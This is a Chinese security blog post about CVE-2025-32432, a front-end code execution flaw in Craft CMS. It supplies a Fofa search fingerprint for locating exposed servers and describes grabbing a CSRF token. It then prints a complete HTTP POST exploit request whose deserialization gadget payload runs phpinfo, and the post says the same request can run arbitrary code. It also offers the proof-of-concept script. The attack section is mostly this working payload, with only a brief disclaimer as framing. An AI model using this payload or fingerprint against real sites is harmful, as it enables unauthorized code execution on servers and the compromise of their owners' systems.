#  CraftCMS 存在前台命令执行漏洞 (CVE-2025-32432)   
 菜狗安全   2025-05-01 05:13  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
Craft CMS是一个开源的内容管理系统，它专注于用户友好的内容创建过程，逻辑清晰明了，是一个高度自由，高度自定义设计的平台吗，可以用来创建个人或企业网站也可以搭建企业级电子商务系统。  
  
**Fofa指纹:header="X-Powered-By: Craft CMS" || banner="X-Powered-By: Craft CMS"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eILwB5V30uVj8RnQrTkgvO2SXP7NGO087eLGyF5Zdy1XZlYh98FGEEAmvnaia2hCicKsa6X7NW7QAQ/640?wx_fmt=webp&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eILwB5V30uVj8RnQrTkgvOicaxomEticklAJdCzXuxibuwZib8GBm7mZoSEdQJ4MtwkZbAk1mJDkFOgw/640?wx_fmt=webp&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
**1.首先访问一下 /admin/login   获取一下CSRF_Token**  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eILwB5V30uVj8RnQrTkgvOkQeAbDzhQw2YB0kob1EuhbUuyo0A1zFV5ib0Nym1EHneZoMUezYhC8g/640?wx_fmt=other&from=appmsg "")  
  
**2.然后把CSRF_TOKEN 添加进去发包即可构造phpinfo 或 执行任意代码**  
  
****  
**Payload (phpinfo):**  
  
****  
```
POST /index.php?p=admin/actions/assets/generate-transform HTTP/2
Host: 127.0.0.1
Cookie: CRAFT_CSRF_TOKEN=e40fa024c0415d8febe047e1b10cb29c177af6f7078425b4a4ad51baa12ead4aa%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A40%3A%22IxdRpsRcEf5rV4Mg9Rlm6oO8MI482Vi9M-arQ6hi%22%3B%7D
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
X-Csrf-Token: mCR9N18c3CaAqUXR6nDCW4gZo0t8cHzu47I46ULar9yg2OGu6dafjNFcGWUvb45Fxc9wo7xEjzyxS88mSh8z1q77DNFwjMbl7fWA3Ljg9-U=
Content-Length: 215

{"assetId":11,"handle":{"width":123,"height":123,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"GuzzleHttp\\Psr7\\FnStream","__construct()":[[]],"_fn_close":"phpinfo"}},"9qsccmw8lve":"="}

```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eILwB5V30uVj8RnQrTkgvO5kKASR4Thhj5SHIKJMlDRmbAxYJgQyUcgtlbMqdOztMz7iaJwKFXOrg/640?wx_fmt=webp&from=appmsg "")  
  
Nuclei 脚本:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5eILwB5V30uVj8RnQrTkgvO9dDwYxIWwqbL4jZIfwDDNaiapoNXEznjDP6UUKEiao0zfQVUbVGugL7Q/640?wx_fmt=png&from=appmsg "")  
## 0x02 脚本下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
  
**POC脚本关注公众号，发送 250501 获取!**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
